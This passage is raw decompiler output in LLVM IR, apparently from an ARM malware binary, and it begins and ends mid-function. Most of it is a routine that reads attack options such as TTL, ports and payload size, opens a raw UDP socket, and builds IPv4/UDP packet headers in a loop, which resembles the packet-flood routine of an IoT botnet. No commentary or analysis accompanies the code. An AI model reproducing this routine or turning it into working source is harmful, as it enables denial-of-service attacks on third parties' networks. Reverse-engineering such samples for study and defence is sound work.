  %v4_cc60 = call i32 @function_13884(i32 %v7_cc58, i32 %v7_cc5c, i32 %v0_cc6c, i32 16384)
  %v0_cc64 = load i32, i32* %r4.global-to-local, align 4
  %v1_cc64 = add i32 %v0_cc64, 1
  %v0_cc68.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_cc68.outer

dec_label_pc_cc68.outer:                          ; preds = %dec_label_pc_cc44, %dec_label_pc_cc58
  %v0_cc68.ph = phi i32 [ %v0_cc68.pre.pre, %dec_label_pc_cc58 ], [ %v1_cc8422, %dec_label_pc_cc44 ]
  %v1_cc5c.ph = phi i32 [ %v1_cc64, %dec_label_pc_cc58 ], [ 0, %dec_label_pc_cc44 ]
  %v0_cc6c = load i32, i32* @r5, align 4
  br label %dec_label_pc_cc68

dec_label_pc_cc68:                                ; preds = %dec_label_pc_cc68.outer, %dec_label_pc_cc68
  %v1_cc5c = phi i32 [ 0, %dec_label_pc_cc68 ], [ %v1_cc5c.ph, %dec_label_pc_cc68.outer ]
  %v8_cc74 = icmp sgt i32 %v0_cc68.ph, %v1_cc5c
  br i1 %v8_cc74, label %dec_label_pc_cc58, label %dec_label_pc_cc68

dec_label_pc_cc80:                                ; preds = %dec_label_pc_cc84, %dec_label_pc_cc44
  %v1_cc8421 = phi i32 [ %v1_cc8422, %dec_label_pc_cc44 ], [ %v1_cc84, %dec_label_pc_cc84 ]
  br label %dec_label_pc_cc84

dec_label_pc_cc84:                                ; preds = %dec_label_pc_cc90, %dec_label_pc_cc80
  %v1_cc84 = phi i32 [ %v1_cc8421, %dec_label_pc_cc80 ], [ %v1_cc84.pre, %dec_label_pc_cc90 ]
  %v1_cc90 = phi i32 [ 0, %dec_label_pc_cc80 ], [ %v1_ccb0, %dec_label_pc_cc90 ]
  store i32 %v1_cc90, i32* @r6, align 4
  %v6_cc8c = icmp slt i32 %v1_cc90, %v1_cc84
  br i1 %v6_cc8c, label %dec_label_pc_cc90, label %dec_label_pc_cc80

dec_label_pc_cc90:                                ; preds = %dec_label_pc_cc84
  %v0_cc88 = load i32, i32* @r5, align 4
  %v0_cc90 = load i32, i32* @sl, align 4
  %v4_cc90 = mul i32 %v1_cc90, 4
  %v5_cc90 = add i32 %v0_cc90, %v4_cc90
  %v6_cc90 = inttoptr i32 %v5_cc90 to i32*
  %v7_cc90 = load i32, i32* %v6_cc90, align 4
  store i32 %v7_cc90, i32* @r4, align 4
  %v2_cc98 = inttoptr i32 %v7_cc90 to i16*
  %v3_cc98 = call i32 @function_f900(i16* %v2_cc98, i32 %v0_cc88)
  %v0_cc9c = load i32, i32* @r8, align 4
  %v1_cc9c = load i32, i32* @r6, align 4
  %v4_cc9c = mul i32 %v1_cc9c, 4
  %v5_cc9c = add i32 %v4_cc9c, %v0_cc9c
  %v6_cc9c = inttoptr i32 %v5_cc9c to i32*
  %v7_cc9c = load i32, i32* %v6_cc9c, align 4
  %v0_cca0 = load i32, i32* @r4, align 4
  %v0_cca4 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ccac = call i32 @function_13884(i32 %v7_cc9c, i32 %v0_cca0, i32 %v0_cca4, i32 16384)
  %v0_ccb0 = load i32, i32* @r6, align 4
  %v1_ccb0 = add i32 %v0_ccb0, 1
  %v1_cc84.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_cc84

; uselistorder directives
  uselistorder i32 %v1_cc84, { 1, 0 }
  uselistorder i32 %v1_cc5c, { 2, 1, 0 }
  uselistorder i32 %v5_cc2c, { 1, 0 }
  uselistorder i32 %v3_cbf0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_cb68, { 1, 0, 2 }
  uselistorder i32 %v3_cb28, { 1, 3, 2, 0 }
  uselistorder i32 %v3_cabc, { 1, 0 }
  uselistorder i32 %v3_ca6c, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 15, 2, 3, 7, 8, 4, 5, 6, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_cc68, { 1, 0 }
  uselistorder label %dec_label_pc_cc68.outer, { 1, 0 }
  uselistorder label %dec_label_pc_cb74, { 1, 0 }
  uselistorder label %dec_label_pc_cb1c, { 1, 0 }
  uselistorder label %dec_label_pc_cb04, { 1, 0 }
}

define i32 @function_ccb8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ccb8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_ccb8 = load i32, i32* @sb, align 4
  %v27_ccb8 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_ccd4 = call i32 @function_144a8(i32 %arg1, i32 4)
  %v0_ccd8 = load i32, i32* @r5, align 4
  store i32 %v0_ccd8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cce8 = load i32, i32* @r4, align 4
  store i32 %v0_cce8, i32* %r0.global-to-local, align 4
  %v5_ccec = inttoptr i32 %v0_ccd8 to i32*
  %v6_ccec = call i32 @function_a45c(i32 %v0_cce8, i32* %v5_ccec, i32 2, i32 0)
  %v1_ccf8 = urem i32 %v6_ccec, 256
  store i32 %v1_ccf8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_cd04 = load i32, i32* @r5, align 4
  store i32 %v0_cd04, i32* %r1.global-to-local, align 4
  %v0_cd08 = load i32, i32* @r4, align 4
  store i32 %v0_cd08, i32* %r0.global-to-local, align 4
  %v5_cd0c = trunc i32 %v6_ccec to i8
  %v6_cd10 = inttoptr i32 %v0_cd04 to i32*
  %v7_cd10 = call i32 @function_a45c(i32 %v0_cd08, i32* %v6_cd10, i32 3, i32 65535)
  %v0_cd14 = load i32, i32* @r5, align 4
  store i32 %v0_cd14, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_cd24 = load i32, i32* @r4, align 4
  store i32 %v0_cd24, i32* %r0.global-to-local, align 4
  %v5_cd28 = inttoptr i32 %v0_cd14 to i32*
  %v6_cd28 = call i32 @function_a45c(i32 %v0_cd24, i32* %v5_cd28, i32 4, i32 64)
  %v1_cd30 = urem i32 %v6_cd28, 256
  store i32 %v1_cd30, i32* %ip.global-to-local, align 4
  %v0_cd34 = load i32, i32* @r5, align 4
  store i32 %v0_cd34, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cd40 = load i32, i32* @r4, align 4
  store i32 %v0_cd40, i32* %r0.global-to-local, align 4
  %v6_cd48 = inttoptr i32 %v0_cd34 to i32*
  %v7_cd48 = call i32 @function_a45c(i32 %v0_cd40, i32* %v6_cd48, i32 5, i32 0)
  %v1_cd54 = urem i32 %v7_cd48, 256
  store i32 %v1_cd54, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_cd60 = load i32, i32* @r5, align 4
  store i32 %v0_cd60, i32* %r1.global-to-local, align 4
  %v0_cd64 = load i32, i32* @r4, align 4
  store i32 %v0_cd64, i32* %r0.global-to-local, align 4
  %v5_cd6c = inttoptr i32 %v0_cd60 to i32*
  %v6_cd6c = call i32 @function_a45c(i32 %v0_cd64, i32* %v5_cd6c, i32 6, i32 65535)
  %v0_cd74 = load i32, i32* @r5, align 4
  store i32 %v0_cd74, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_cd6c, i32* %sb.global-to-local, align 4
  %v0_cd84 = load i32, i32* @r4, align 4
  store i32 %v0_cd84, i32* %r0.global-to-local, align 4
  %v4_cd88 = inttoptr i32 %v0_cd74 to i32*
  %v5_cd88 = call i32 @function_a45c(i32 %v0_cd84, i32* %v4_cd88, i32 7, i32 65535)
  %v0_cd8c = load i32, i32* @r5, align 4
  store i32 %v0_cd8c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_cd88, i32* @sl, align 4
  %v0_cd9c = load i32, i32* @r4, align 4
  store i32 %v0_cd9c, i32* %r0.global-to-local, align 4
  %v4_cda0 = inttoptr i32 %v0_cd8c to i32*
  %v5_cda0 = call i32 @function_a45c(i32 %v0_cd9c, i32* %v4_cda0, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_cdac = load i32, i32* @r5, align 4
  store i32 %v0_cdac, i32* %r1.global-to-local, align 4
  store i32 %v5_cda0, i32* @r6, align 4
  %v0_cdb4 = load i32, i32* @r4, align 4
  store i32 %v0_cdb4, i32* %r0.global-to-local, align 4
  %v4_cdb8 = inttoptr i32 %v0_cdac to i32*
  %v5_cdb8 = call i32 @function_a45c(i32 %v0_cdb4, i32* %v4_cdb8, i32 1, i32 1)
  %v2_cdc4 = load i32, i32* @global_var_23394.88, align 4
  store i32 %v2_cdc4, i32* %r3.global-to-local, align 4
  %v1_cdc8 = urem i32 %v5_cdb8, 256
  store i32 %v1_cdc8, i32* %ip.global-to-local, align 4
  %v0_cdcc = load i32, i32* @r5, align 4
  store i32 %v0_cdcc, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_cdd4 = load i32, i32* @r4, align 4
  store i32 %v0_cdd4, i32* %r0.global-to-local, align 4
  %v5_cddc = inttoptr i32 %v0_cdcc to i32*
  %v6_cddc = call i32 @function_a45c(i32 %v0_cdd4, i32* %v5_cddc, i32 25, i32 %v2_cdc4)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_cdf0 = call i32 @function_13940(i32 2, i32 3, i32 17)
  store i32 %v3_cdf0, i32* %r0.global-to-local, align 4
  %v7_cdf4 = icmp eq i32 %v3_cdf0, -1
  store i1 %v7_cdf4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_cdf0, i32* @fp, align 4
  br i1 %v7_cdf4, label %dec_label_pc_d194, label %dec_label_pc_ce00

dec_label_pc_ce00:                                ; preds = %dec_label_pc_ccb8
  store i32 1, i32* %stack_var_-44, align 4
  %v6_ce08 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_ce08, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ce1c = call i32 @function_138fc(i32 %v3_cdf0, i32 0, i32 3, i32 %v6_ce08, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ce1c, i32* %r0.global-to-local, align 4
  %v7_ce20 = icmp eq i32 %v5_ce1c, -1
  store i1 %v7_ce20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ce20, label %dec_label_pc_d18c, label %dec_label_pc_ce28

dec_label_pc_ce28:                                ; preds = %dec_label_pc_ce00
  %v0_ce28 = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_ce34 = urem i32 %v0_ce28, 65536
  store i32 %v3_ce34, i32* %r2.global-to-local, align 4
  %v3_ce38 = icmp ugt i32 %v3_ce34, 1459
  %v9_ce38 = icmp eq i32 %v3_ce34, 1460
  store i1 %v9_ce38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ce38, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_ce28
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_ce28, %bb
  %v0_ce94 = phi i32 [ %v3_ce34, %dec_label_pc_ce28 ], [ 1460, %bb ]
  store i32 %v7_cd10, i32* %r0.global-to-local, align 4
  %v0_ce44 = load i32, i32* %sb.global-to-local, align 4
  %v3_ce4c = urem i32 %v0_ce44, 65536
  store i32 %v3_ce4c, i32* %ip.global-to-local, align 4
  %v0_ce50 = load i32, i32* @r7, align 4
  %v2_ce50 = icmp eq i32 %v0_ce50, 0
  store i1 %v2_ce50, i1* %cpsr_z.global-to-local, align 1
  %v0_ce54 = load i32, i32* @sl, align 4
  %v3_ce54 = mul i32 %v0_ce54, 65536
  br i1 %v2_ce50, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  store i32 %v0_ce94, i32* %ip.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_ce84 = phi i32 [ %v3_ce4c, %bb48 ], [ %v0_ce94, %bb49 ]
  %v3_ce64 = urem i32 %v0_ce54, 65536
  store i32 %v3_ce64, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ce6c = urem i32 %v7_cd10, 65536
  store i32 %v3_ce6c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ce50, label %.thread, label %dec_label_pc_ce8c

.thread:                                          ; preds = %bb50
  %v2_ce80 = add nsw i32 %v1_ce84, 28
  store i32 %v2_ce80, i32* @sb, align 4
  %v2_ce84 = add nsw i32 %v1_ce84, 8
  store i32 %v2_ce84, i32* @sl, align 4
  br label %dec_label_pc_cfb0.preheader

dec_label_pc_ce8c:                                ; preds = %bb50
  %v1_ce94 = add nuw nsw i32 %v0_ce94, 28
  store i32 %v1_ce94, i32* @sb, align 4
  %v1_ce98 = add nuw nsw i32 %v0_ce94, 8
  store i32 %v1_ce98, i32* @sl, align 4
  %tmp51 = mul i32 %v0_ce44, 256
  %v3_ceac = and i32 %tmp51, 65280
  %tmp52 = udiv i32 %v0_ce44, 256
  %v4_cebc = urem i32 %tmp52, 256
  %v5_cebc = or i32 %v4_cebc, %v3_ceac
  store i32 %v5_cebc, i32* @r6, align 4
  store i32 %v3_ce54, i32* %r1.global-to-local, align 4
  %tmp53 = mul nuw nsw i32 %v1_ce94, 256
  %v3_cec8 = and i32 %tmp53, 65280
  store i32 %v3_cec8, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v0_ce54, 256
  %v3_cecc = and i32 %tmp54, 65280
  %tmp55 = mul nuw nsw i32 %v1_ce98, 256
  %v3_ced0 = and i32 %tmp55, 65280
  store i32 %v3_ced0, i32* %ip.global-to-local, align 4
  %tmp56 = udiv i32 %v1_ce94, 256
  %v4_ced4 = urem i32 %tmp56, 256
  %v5_ced4 = or i32 %v4_ced4, %v3_cec8
  store i32 %v5_ced4, i32* @lr, align 4
  %tmp57 = udiv i32 %v0_ce54, 256
  %v4_ced8 = urem i32 %tmp57, 256
  %v5_ced8 = or i32 %v4_ced8, %v3_cecc
  store i32 %v5_ced8, i32* %r0.global-to-local, align 4
  %trunc = trunc i32 %v1_ce98 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp58 = mul i32 %v7_cd10, 256
  %v3_cee0 = and i32 %tmp58, 65280
  store i32 %v3_cee0, i32* %r2.global-to-local, align 4
  %tmp59 = udiv i32 %v7_cd10, 256
  %v4_cef0 = urem i32 %tmp59, 256
  %v5_cef0 = or i32 %v4_cef0, %v3_cee0
  store i32 %v5_cef0, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %v4_cf48 = sext i8 %v5_cd0c to i32
  %sext6 = mul nuw i32 %v5_ced4, 65536
  %v4_cf64 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_ced8, 65536
  %v7_cf98 = sdiv i32 %sext7, 65536
  %v1_cf58 = trunc i32 %v6_cd28 to i8
  %v3_cf98 = sext i16 %rev to i32
  br label %dec_label_pc_cef8

dec_label_pc_cef8:                                ; preds = %.thread9, %dec_label_pc_ce8c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_cf04 = call i32 @function_144a8(i32 1510, i32 1)
  store i32 %v2_cf04, i32* %r0.global-to-local, align 4
  store i32 %v2_ccd4, i32* %r3.global-to-local, align 4
  %v3_cf0c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_cf0c, i32* %r1.global-to-local, align 4
  %v2_cf10 = load i32, i32* @r4, align 4
  %v5_cf10 = mul i32 %v2_cf10, 4
  %v6_cf10 = add i32 %v5_cf10, %v2_ccd4
  %v7_cf10 = inttoptr i32 %v6_cf10 to i32*
  store i32 %v2_cf04, i32* %v7_cf10, align 4
  %v0_cf14 = load i32, i32* %r3.global-to-local, align 4
  %v1_cf14 = load i32, i32* %r1.global-to-local, align 4
  %v4_cf14 = mul i32 %v1_cf14, 4
  %v5_cf14 = add i32 %v4_cf14, %v0_cf14
  %v6_cf14 = inttoptr i32 %v5_cf14 to i32*
  %v7_cf14 = load i32, i32* %v6_cf14, align 4
  store i32 %v7_cf14, i32* %r0.global-to-local, align 4
  %v1_cf18 = inttoptr i32 %v7_cf14 to i8*
  %v2_cf18 = load i8, i8* %v1_cf18, align 1
  %tmp = urem i8 %v2_cf18, 16
  %v1_cf1c = zext i8 %tmp to i32
  %v1_cf20 = or i32 %v1_cf1c, 64
  store i32 %v1_cf20, i32* %r3.global-to-local, align 4
  %v1_cf24 = trunc i32 %v1_cf20 to i8
  store i8 %v1_cf24, i8* %v1_cf18, align 1
  %v0_cf28 = load i32, i32* %r0.global-to-local, align 4
  %v1_cf28 = inttoptr i32 %v0_cf28 to i8*
  %v2_cf28 = load i8, i8* %v1_cf28, align 1
  %v1_cf2c = and i8 %v2_cf28, -16
  %v1_cf30 = or i8 %v1_cf2c, 5
  store i32 %v1_cd54, i32* %ip.global-to-local, align 4
  %v0_cf38 = load i32, i32* %r1.global-to-local, align 4
  %v3_cf38 = mul i32 %v0_cf38, 32
  store i32 %v3_cf38, i32* %r2.global-to-local, align 4
  store i8 %v1_cf30, i8* %v1_cf28, align 1
  %v0_cf40 = load i32, i32* %r1.global-to-local, align 4
  %v1_cf40 = add i32 %v0_cf40, 1
  store i32 %v1_cf40, i32* @r4, align 4
  %v0_cf44 = load i32, i32* %r2.global-to-local, align 4
  %tmp61 = mul i32 %v0_cf40, -8
  %v5_cf44 = add i32 %v0_cf44, %tmp61
  store i32 %v5_cf44, i32* %r2.global-to-local, align 4
  store i32 %v4_cf48, i32* %r1.global-to-local, align 4
  %v2_cf4c = load i32, i32* %r0.global-to-local, align 4
  %v3_cf4c = add i32 %v2_cf4c, 1
  %v4_cf4c = inttoptr i32 %v3_cf4c to i8*
  store i8 %v5_cd0c, i8* %v4_cf4c, align 1
  store i32 %v1_cd30, i32* %r3.global-to-local, align 4
  %v0_cf54 = load i32, i32* %ip.global-to-local, align 4
  %v2_cf54 = icmp eq i32 %v0_cf54, 0
  store i1 %v2_cf54, i1* %cpsr_z.global-to-local, align 1
  %v2_cf58 = load i32, i32* %r0.global-to-local, align 4
  %v3_cf58 = add i32 %v2_cf58, 8
  %v4_cf58 = inttoptr i32 %v3_cf58 to i8*
  store i8 %v1_cf58, i8* %v4_cf58, align 1
  %v0_cf5c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cf5c, label %.thread9, label %bb60

bb60:                                             ; preds = %dec_label_pc_cef8
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_cf60 = load i32, i32* %r0.global-to-local, align 4
  %v4_cf60 = add i32 %v3_cf60, 6
  %v5_cf60 = inttoptr i32 %v4_cf60 to i16*
  store i16 64, i16* %v5_cf60, align 2
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_cef8, %bb60
  store i32 %v4_cf64, i32* %ip.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_cf6c = load i32, i32* %r0.global-to-local, align 4
  %v3_cf6c = add i32 %v2_cf6c, 9
  %v4_cf6c = inttoptr i32 %v3_cf6c to i8*
  store i8 17, i8* %v4_cf6c, align 1
  %v0_cf70 = load i32, i32* %ip.global-to-local, align 4
  %v1_cf70 = trunc i32 %v0_cf70 to i16
  %v2_cf70 = load i32, i32* %r0.global-to-local, align 4
  %v3_cf70 = add i32 %v2_cf70, 2
  %v4_cf70 = inttoptr i32 %v3_cf70 to i16*
  store i16 %v1_cf70, i16* %v4_cf70, align 2
  store i32 %v6_cddc, i32* %ip.global-to-local, align 4
  %v1_cf78 = load i32, i32* %r0.global-to-local, align 4
  %v2_cf78 = add i32 %v1_cf78, 12
  %v3_cf78 = inttoptr i32 %v2_cf78 to i32*
  store i32 %v6_cddc, i32* %v3_cf78, align 4
  %v0_cf7c = load i32, i32* %r2.global-to-local, align 4
  %v1_cf7c = load i32, i32* @r8, align 4
  %v2_cf7c = add i32 %v1_cf7c, %v0_cf7c
  store i32 %v2_cf7c, i32* %r2.global-to-local, align 4
  %v1_cf80 = add i32 %v2_cf7c, 16
  %v2_cf80 = inttoptr i32 %v1_cf80 to i32*
  %v3_cf80 = load i32, i32* %v2_cf80, align 4
  store i32 %v3_cf80, i32* %r3.global-to-local, align 4
  %v0_cf84 = load i32, i32* @r5, align 4
  %v1_cf84 = trunc i32 %v0_cf84 to i16
  %v2_cf84 = load i32, i32* %r0.global-to-local, align 4
  %v3_cf84 = add i32 %v2_cf84, 4
  %v4_cf84 = inttoptr i32 %v3_cf84 to i16*
  store i16 %v1_cf84, i16* %v4_cf84, align 2
  %v0_cf88 = load i32, i32* %r0.global-to-local, align 4
  %v1_cf88 = add i32 %v0_cf88, 20
  store i32 %v1_cf88, i32* %r1.global-to-local, align 4
  %v0_cf8c = load i32, i32* %r3.global-to-local, align 4
  %v2_cf8c = add i32 %v0_cf88, 16
  %v3_cf8c = inttoptr i32 %v2_cf8c to i32*
  store i32 %v0_cf8c, i32* %v3_cf8c, align 4
  %v0_cf90 = load i32, i32* @r6, align 4
  %v1_cf90 = trunc i32 %v0_cf90 to i16
  %v2_cf90 = load i32, i32* %r0.global-to-local, align 4
  %v3_cf90 = add i32 %v2_cf90, 20
  %v4_cf90 = inttoptr i32 %v3_cf90 to i16*
  store i16 %v1_cf90, i16* %v4_cf90, align 2
  store i32 %v3_cf98, i32* %r0.global-to-local, align 4
  store i32 %v7_cf98, i32* %r3.global-to-local, align 4
  %v0_cf9c = load i32, i32* @r4, align 4
  %v1_cf9c = load i32, i32* @r7, align 4
  %v9_cf9c = icmp eq i32 %v0_cf9c, %v1_cf9c
  store i1 %v9_cf9c, i1* %cpsr_z.global-to-local, align 1
  %v2_cfa0 = load i32, i32* %r1.global-to-local, align 4
  %v3_cfa0 = add i32 %v2_cfa0, 4
  %v4_cfa0 = inttoptr i32 %v3_cfa0 to i16*
  store i16 %rev, i16* %v4_cfa0, align 2
  %v0_cfa4 = load i32, i32* %r3.global-to-local, align 4
  %v1_cfa4 = trunc i32 %v0_cfa4 to i16
  %v2_cfa4 = load i32, i32* %r1.global-to-local, align 4
  %v3_cfa4 = add i32 %v2_cfa4, 2
  %v4_cfa4 = inttoptr i32 %v3_cfa4 to i16*
  store i16 %v1_cfa4, i16* %v4_cfa4, align 2
  %v0_cfa8 = load i32, i32* @r4, align 4
  store i32 %v0_cfa8, i32* %stack_var_-44, align 4
  %v5_cfac = icmp slt i32 %v0_cf9c, %v1_cf9c
  br i1 %v5_cfac, label %dec_label_pc_cef8, label %dec_label_pc_cfb0.preheader.loopexit

dec_label_pc_cfb0.preheader.loopexit:             ; preds = %.thread9
  %v0_cfb4.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_cfb0.preheader

dec_label_pc_cfb0.preheader:                      ; preds = %.thread, %dec_label_pc_cfb0.preheader.loopexit
  %v0_cfb4.pre = phi i32 [ %v0_cfb4.pre.pre, %dec_label_pc_cfb0.preheader.loopexit ], [ 0, %.thread ]
  %v3_d11c = icmp eq i32 %v6_cddc, -1
  %v8_d11c = icmp eq i32 %v6_cddc, -1
  %v3_d134 = icmp eq i32 %v3_ce6c, 65535
  %v2_d170 = icmp eq i32 %v1_cdc8, 0
  br label %dec_label_pc_cfb0

dec_label_pc_cfb0:                                ; preds = %dec_label_pc_cfb0, %dec_label_pc_d0b0, %dec_label_pc_cfb0.preheader
  %v0_cfb4 = phi i32 [ %v0_cfb4.pre, %dec_label_pc_cfb0.preheader ], [ 0, %dec_label_pc_d0b0 ], [ 0, %dec_label_pc_cfb0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_cfb4 = icmp eq i32 %v0_cfb4, 0
  store i1 %v2_cfb4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_cfb4, label %dec_label_pc_cfb0, label %dec_label_pc_cfc0

dec_label_pc_cfc0:                                ; preds = %dec_label_pc_cfb0, %dec_label_pc_d0b0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cfc4

dec_label_pc_cfc4:                                ; preds = %dec_label_pc_d02c, %dec_label_pc_cfc0
  %v1_cfd8 = phi i32 [ %v1_d0a0, %dec_label_pc_d02c ], [ 0, %dec_label_pc_cfc0 ]
  %v5_cfc8 = mul i32 %v1_cfd8, 24
  %v1_cfcc = load i32, i32* @r8, align 4
  %v2_cfcc = add i32 %v1_cfcc, %v5_cfc8
  store i32 %v2_cfcc, i32* %r3.global-to-local, align 4
  store i32 %v2_ccd4, i32* %r1.global-to-local, align 4
  %v1_cfd4 = add i32 %v2_cfcc, 20
  %v2_cfd4 = inttoptr i32 %v1_cfd4 to i8*
  %v3_cfd4 = load i8, i8* %v2_cfd4, align 1
  %v4_cfd4 = zext i8 %v3_cfd4 to i32
  store i32 %v4_cfd4, i32* %r2.global-to-local, align 4
  %v4_cfd8 = mul i32 %v1_cfd8, 4
  %v5_cfd8 = add i32 %v4_cfd8, %v2_ccd4
  %v6_cfd8 = inttoptr i32 %v5_cfd8 to i32*
  %v7_cfd8 = load i32, i32* %v6_cfd8, align 4
  store i32 %v7_cfd8, i32* @r5, align 4
  %v7_cfdc = icmp eq i8 %v3_cfd4, 31
  store i1 %v7_cfdc, i1* %cpsr_z.global-to-local, align 1
  %v1_cfe0 = add i32 %v7_cfd8, 20
  store i32 %v1_cfe0, i32* @r6, align 4
  %tmp62 = icmp ult i8 %v3_cfd4, 32
  br i1 %tmp62, label %dec_label_pc_d0c4, label %dec_label_pc_cfe8

dec_label_pc_cfe8:                                ; preds = %dec_label_pc_cfc4
  store i32 %v6_cddc, i32* %r3.global-to-local, align 4
  store i1 %v8_d11c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_d11c, label %dec_label_pc_d124, label %dec_label_pc_cff4

dec_label_pc_cff4:                                ; preds = %dec_label_pc_d0c4, %dec_label_pc_cfe8
  store i32 %v3_ce6c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_d134, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d134, label %dec_label_pc_d140, label %dec_label_pc_d008

dec_label_pc_d008:                                ; preds = %dec_label_pc_d124.dec_label_pc_d008_crit_edge, %dec_label_pc_cff4
  %v1_d00c = phi i32 [ %v1_d00c.pre, %dec_label_pc_d124.dec_label_pc_d008_crit_edge ], [ 65535, %dec_label_pc_cff4 ]
  store i32 %v3_ce4c, i32* %r0.global-to-local, align 4
  %v9_d00c = icmp eq i32 %v3_ce4c, %v1_d00c
  store i1 %v9_d00c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d00c, label %dec_label_pc_d154, label %dec_label_pc_d014

dec_label_pc_d014:                                ; preds = %dec_label_pc_d140, %dec_label_pc_d008
  %v1_d018 = phi i32 [ %v1_d14c, %dec_label_pc_d140 ], [ %v1_d00c, %dec_label_pc_d008 ]
  store i32 %v3_ce64, i32* %r1.global-to-local, align 4
  %v9_d018 = icmp eq i32 %v3_ce64, %v1_d018
  store i1 %v9_d018, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d018, label %dec_label_pc_d168, label %dec_label_pc_d020

dec_label_pc_d020:                                ; preds = %dec_label_pc_d154, %dec_label_pc_d014
  store i32 %v1_cdc8, i32* %r3.global-to-local, align 4
  store i1 %v2_d170, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d170, label %dec_label_pc_d02c, label %dec_label_pc_d17c

dec_label_pc_d02c:                                ; preds = %dec_label_pc_d020, %dec_label_pc_d168, %dec_label_pc_d17c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_d030 = load i32, i32* @r5, align 4
  %v3_d030 = add i32 %v2_d030, 10
  %v4_d030 = inttoptr i32 %v3_d030 to i16*
  store i16 0, i16* %v4_d030, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_d038 = load i32, i32* @r5, align 4
  store i32 %v0_d038, i32* @r0, align 4
  %v2_d03c = call i32 @function_dc98(i32 %v0_d038, i32 20)
